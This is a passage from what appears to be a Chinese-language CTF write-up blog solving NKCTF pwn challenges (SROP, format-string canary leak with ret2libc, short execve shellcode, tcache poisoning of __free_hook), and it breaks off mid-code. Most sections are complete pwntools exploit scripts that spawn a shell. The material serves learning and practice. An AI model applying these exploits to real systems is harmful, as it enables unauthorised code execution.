class="line"><span class="meta">#libc = cdll.LoadLibrary(<span class="string">&#x27;/lib/x86_64-linux-gnu/lib</span></span></span><br><span class="line"><span class="string"><span class="meta"># context.arch = &quot;i386&quot;</span></span></span><br><span class="line"><span class="string"><span class="meta">context.arch = &quot;amd64&quot;</span></span></span><br><span class="line"><span class="string"><span class="meta">elf = ELF(&quot;./nk&quot;)</span></span></span><br><span class="line"><span class="string"><span class="meta">def debug():</span></span></span><br><span class="line"><span class="string"><span class="meta">    gdb.attach(io)</span></span></span><br><span class="line"><span class="string"><span class="meta">    pause()</span></span></span><br><span class="line"><span class="string"><span class="meta"></span></span></span><br><span class="line"><span class="string"><span class="meta">io.recv()</span></span></span><br><span class="line"><span class="string"><span class="meta">bss_addr= 0x404080+0x100</span></span></span><br><span class="line"><span class="string"><span class="meta">main_addr = elf.sym[&#x27;</span>main<span class="string">&#x27;]</span></span></span><br><span class="line"><span class="string"><span class="meta">rax_15 = 0x0000000000401146</span></span></span><br><span class="line"><span class="string"><span class="meta">syscall_addr = 0x000000000040114e</span></span></span><br><span class="line"><span class="string"><span class="meta">frame = SigreturnFrame()</span></span></span><br><span class="line"><span class="string"><span class="meta">frame.rax = 0</span></span></span><br><span class="line"><span class="string"><span class="meta">frame.rdi = 0</span></span></span><br><span class="line"><span class="string"><span class="meta">frame.rsi = bss_addr</span></span></span><br><span class="line"><span class="string"><span class="meta">frame.rdx = 0x200</span></span></span><br><span class="line"><span class="string"><span class="meta">frame.rip = syscall_addr</span></span></span><br><span class="line"><span class="string"><span class="meta">frame.rsp = bss_addr</span></span></span><br><span class="line"><span class="string"><span class="meta">payload = cyclic(0x18)+p64(rax_15)+p64(syscall_addr)+bytes(frame)</span></span></span><br><span class="line"><span class="string"><span class="meta">io.sendline(payload)</span></span></span><br><span class="line"><span class="string"><span class="meta">binsh_addr = bss_addr +264</span></span></span><br><span class="line"><span class="string"><span class="meta">frame = SigreturnFrame()</span></span></span><br><span class="line"><span class="string"><span class="meta">frame.rax = 59</span></span></span><br><span class="line"><span class="string"><span class="meta">frame.rdi = binsh_addr</span></span></span><br><span class="line"><span class="string"><span class="meta">frame.rsi = 0</span></span></span><br><span class="line"><span class="string"><span class="meta">frame.rdx = 0</span></span></span><br><span class="line"><span class="string"><span class="meta">frame.rip = syscall_addr</span></span></span><br><span class="line"><span class="string"><span class="meta">payload = p64(rax_15)+p64(syscall_addr)+bytes(frame)+b&#x27;</span>/bin/sh\x00&#x27;</span></span><br><span class="line"><span class="meta"># gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+str(rax_15))</span></span><br><span class="line"><span class="meta"># pause(0)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="baby-rop"><a href="#baby-rop" class="headerlink" title="baby_rop"></a>baby_rop</h2><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303262219624.png" title="image-20230326221948588" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303262219624.png" alt="image-20230326221948588"></a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *format; <span class="comment">// [rsp+8h] [rbp-118h]</span></span><br><span class="line">  <span class="type">char</span> src[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">8</span>]; <span class="comment">// [rsp+18h] [rbp-108h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">248</span>]; <span class="comment">// [rsp+20h] [rbp-100h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, <span class="string">&quot;Hello, &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to the NKCTF message board!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What is your name: &quot;</span>);</span><br><span class="line">  my_read(src, <span class="number">8LL</span>);</span><br><span class="line">  format = <span class="built_in">strcat</span>(dest, src);</span><br><span class="line">  <span class="built_in">printf</span>(format);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What are your comments and suggestions for the NKCTF: &quot;</span>);</span><br><span class="line">  my_read(v4, <span class="number">256LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Thank you, we will read your comments and suggestions carefully.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>格式化字符串 顺便还可以往栈上写数据 不过并不能栈溢出 一开始确实没什么思路 不过后来发现main函数结束前的指令有点不一样</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">000000000040138</span>C                 endbr64</span><br><span class="line">.text:<span class="number">0000000000401390</span>                 push    rbp</span><br><span class="line">.text:<span class="number">0000000000401391</span>                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">0000000000401394</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000401399</span>                 call    init</span><br><span class="line">.text:<span class="number">000000000040139</span>E                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">00000000004013</span>A3                 call    vuln</span><br><span class="line">.text:<span class="number">00000000004013</span>A8                 leave</span><br><span class="line">.text:<span class="number">00000000004013</span>A9                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">00000000004013</span>AE                 pop     rbp</span><br><span class="line">.text:<span class="number">00000000004013</span>AF                 retn</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303262225852.png" title="image-20230326222527799" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303262225852.png" alt="image-20230326222527799"></a></p><p>最后rsp指向的是环境变量那一块 然后我就想能不能破坏一下栈结构 看能不能利用写栈上0x100的字节构造一个rop链</p><p>然后就想到canary了嘛 调用___stack_chk_fail的话总归会对栈结构产生影响 再加上有格式化字符串漏洞 泄露canary还是小菜一碟的</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io.recvuntil(<span class="string">&quot;What is your name: &quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x401340&#x27;)</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;%41$p%p&#x27;</span>)</span><br><span class="line">io.recv(<span class="number">7</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(io.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&quot;canary :&quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line">stack_addr = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&quot;stack_addr :&quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br></pre></td></tr></table></figure><p>计算一下偏移泄露canary 顺便不要浪费机会 顺便泄露一下栈地址 到时候还要用到binsh字符串呢</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(ret_addr)*<span class="number">30</span>+p64(main_addr)+p64(canary)</span><br><span class="line">gdb.attach(io,<span class="string">&#x27;b *0x40138B&#x27;</span>)</span><br><span class="line">pause(<span class="number">0</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure><p>然后试着覆盖一下canary 你就会发现最后的rsp会乱偏 为了提高打通的效率 我们就多塞几个ret 这样确保可以返回到main函数</p><p>然后回到main函数以后 再次利用格式化字符串泄露libc基址 然后同样的办法构造system链就行了</p><p>顺便吐槽一下不给libc的行为 2.31 9.9的用libcsearch也查不到 一血就这样没了 就拿了个三血</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node.yuzhian.com.cn&quot;,34395)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/chen/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;</span>)</span><br><span class="line"><span class="comment">#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&quot;./刷题/libc-2.32.so&quot;)</span></span><br><span class="line"><span class="comment"># context.arch = &quot;i386&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;What is your name: &quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x401340&#x27;)</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;%41$p%p&#x27;</span>)</span><br><span class="line">io.recv(<span class="number">7</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(io.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&quot;canary :&quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line">stack_addr = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&quot;stack_addr :&quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">io.recvuntil(<span class="string">&quot;What are your comments and suggestions for the NKCTF: &quot;</span>)</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">start_addr = elf.sym[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">ret_addr = <span class="number">0x000000000040101a</span></span><br><span class="line">rsp_addr = <span class="number">0x000000000040140d</span></span><br><span class="line">payload = p64(ret_addr)*<span class="number">30</span>+p64(main_addr)+p64(canary)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;What is your name: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;%25$p&#x27;</span>)</span><br><span class="line">addr = <span class="built_in">int</span>(io.recvuntil(<span class="string">&quot;What&quot;</span>,drop = <span class="literal">True</span>)[-<span class="number">14</span>:],<span class="number">16</span>) </span><br><span class="line">success(<span class="string">&quot;addr :&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"><span class="comment">#obj = LibcSearcher(&quot;_IO_2_1_stderr_&quot;,addr)</span></span><br><span class="line">libc_addr = addr - libc.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]<span class="comment">#obj.dump(&quot;_IO_2_1_stderr_&quot;)</span></span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">rdi_addr = <span class="number">0x0000000000401413</span></span><br><span class="line">binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">payload = p64(ret_addr)*<span class="number">28</span>+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)+p64(canary)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="9961code"><a href="#9961code" class="headerlink" title="9961code"></a>9961code</h2><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303262235912.png" title="image-20230326223507795" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303262235912.png" alt="image-20230326223507795"></a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  buf = (<span class="type">void</span> *)(<span class="type">int</span>)mmap((<span class="type">void</span> *)<span class="number">0x9961000</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Last night i played touhou fuujinroku ~ Mountain of Faith\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;F**k! I failed and 9961 in the end!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;In that case, you can only enter a very short shellcode!\n&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x16</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I hope you can NMNB it!&quot;</span>);</span><br><span class="line">  mprotect(buf, <span class="number">0x1000</span>uLL, <span class="number">4</span>);</span><br><span class="line">  JUMPOUT(<span class="number">0x9961000</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>手写shellcode 一开始我是想着先构造mprotect 开一下0x9961000的可写可读权限 然后返回main函数重新构造read链 但是发现不行啊 开了pie不知道要怎么返回去 想了半天 问了其他师傅 学了一手直接打</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node2.yuzhian.com.cn&quot;,36613)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">libc = ELF(<span class="string">&quot;./glibc-all-in-one/libs/2.32-0ubuntu3.2_amd64/libc-2.32.so&quot;</span>)</span><br><span class="line"><span class="comment">#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc-2.32.so&quot;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&quot;./locate&quot;)</span></span><br><span class="line"><span class="comment"># context.arch = &quot;i386&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;In that case, you can only enter a very short shellcode!&quot;</span>)</span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    xor rsi,rsi</span></span><br><span class="line"><span class="string">    lea rdi,[r15+0xe]</span></span><br><span class="line"><span class="string">    cdq</span></span><br><span class="line"><span class="string">    mov ax,59</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0x139B)&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.send(asm(shellcode)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;I hope you can NMNB it!&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>学到了cdq这个指令 可以把eax第31位赋值给edx所有的bit 在这里也就是起到了清空rdx寄存器的作用</p><p>值得一题的就是本地死活打不通 但是远程能通 不知道什么情况</p><h2 id="baby-heap"><a href="#baby-heap" class="headerlink" title="baby_heap"></a>baby_heap</h2><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303262247404.png" title="image-20230326224735286" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303262247404.png" alt="image-20230326224735286"></a></p><p>这题堆开局就给我来一记重锤 用xclibc换libc版本的时候 运行提示段内存错误</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303262248348.png" title="image-20230326224848303" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303262248348.png" alt="image-20230326224848303"></a></p><p>然后发现是libc没有换上 那就手动换一下吧</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">patchelf --replace-needed /lib/x86_64-linux-gnu/libc.so.6 /home/chen/glibc-all-in-one/libs/2.32-0ubuntu3_amd64/ ./pwn</span><br></pre></td></tr></table></figure><p>程序函数给齐了 add delete edit show</p><p>add函数最多申请0x100 delete函数置零了指针 不存在UAF edit函数存在一个字节的溢出 show函数可以打印出堆块内容</p><p>还真是easy_heap 这题用到的办法是我最开始学堆的时候用的 利用单字节溢出合并两个chunk 释放到unsortedbin中 然后再申请同样size的小chunk出来就存在chunk overlap  只不过中途会有些小问题</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x40</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">3</span>+i,<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(<span class="number">3</span>+i)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+<span class="string">b&#x27;\xa1&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b&#x27;\x0a&#x27;</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">main_arena_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">96</span>-<span class="number">0xa</span></span><br><span class="line">libc_addr = main_arena_addr - (libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]+<span class="number">0x10</span>)</span><br><span class="line">free_hook = libc_addr + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br></pre></td></tr></table></figure><p>一个是2.32的main_arena_addr+xxh末尾是\x00 所以要先覆盖成其他值</p><p>还有一点是接下来想再申请0x40的chunk 也就是chunk2 构成一个chunk overlap的时候 报错了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">malloc(): unsorted double linked list corrupted</span><br></pre></td></tr></table></figure><p>是因为此时unsortedchunk的fd域被破坏了</p><p> <a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303262258747.png" title="image-20230326225858709" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303262258747.png" alt="image-20230326225858709"></a></p><p>那简单 复原一下就好了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">2</span>,p64(main_arena_addr+<span class="number">96</span>)*<span class="number">2</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x40</span>)</span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">key = u64(io.recvuntil(<span class="string">&quot;\x0a&quot;</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;key :&quot;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line">edit(<span class="number">2</span>,p64(free_hook^key))</span><br></pre></td></tr></table></figure><p>这时候就利用chunk overlap来实现tcachebin attack libc版本是2.32 所以还需要注意一下tcache的key机制</p><p>但是这时候却申请不出来free_hook的chunk</p><p>因为此时plmalloc认为这个链表中已经没有chunk了 前面的数值是0 再次申请不会去对应链表中查找 而是直接分配一个新的</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303262302150.png" title="image-20230326230202112" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303262302150.png" alt="image-20230326230202112"></a></p><p>解决办法就是多释放几个进去就行了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;ctf.comentropy.cn&quot;,8301)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">libc = ELF(<span class="string">&quot;./glibc-all-in-one/libs/2.32-0ubuntu3.2_amd64/libc-2.32.so&quot;</span>)</span><br><span class="line"><span class="comment">#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc-2.32.so&quot;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&quot;./locate&quot;)</span></span><br><span class="line"><span class="comment"># context.arch = &quot;i386&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Enter the index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Enter the Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Enter the index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Enter the index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Enter the content: &quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Enter the index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x40</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">3</span>+i,<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(<span class="number">3</span>+i)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+<span class="string">b&#x27;\xa1&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b&#x27;\x0a&#x27;</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">main_arena_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">96</span>-<span class="number">0xa</span></span><br><span class="line">libc_addr = main_arena_addr - (libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]+<span class="number">0x10</span>)</span><br><span class="line">free_hook = libc_addr + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">edit(<span class="number">2</span>,p64(main_arena_addr+<span class="number">96</span>)*<span class="number">2</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x40</span>)</span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">key = u64(io.recvuntil(<span class="string">&quot;\x0a&quot;</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;key :&quot;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line">add(<span class="number">14</span>,<span class="number">0x40</span>)</span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line">delete(<span class="number">13</span>)</span><br><span class="line">delete(<span class="number">14</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(free_hook^key))</span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(system_addr))</span><br><span class="line">edit(<span class="number">15</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">15</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="only-read"><a href="#only-read" class="headerlink" title="only_read"></a>only_read</h2><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303262304190.png" title="image-20230326230402154" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303262304190.png" alt="image-20230326230402154"></a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s1[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [rsp+40h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span 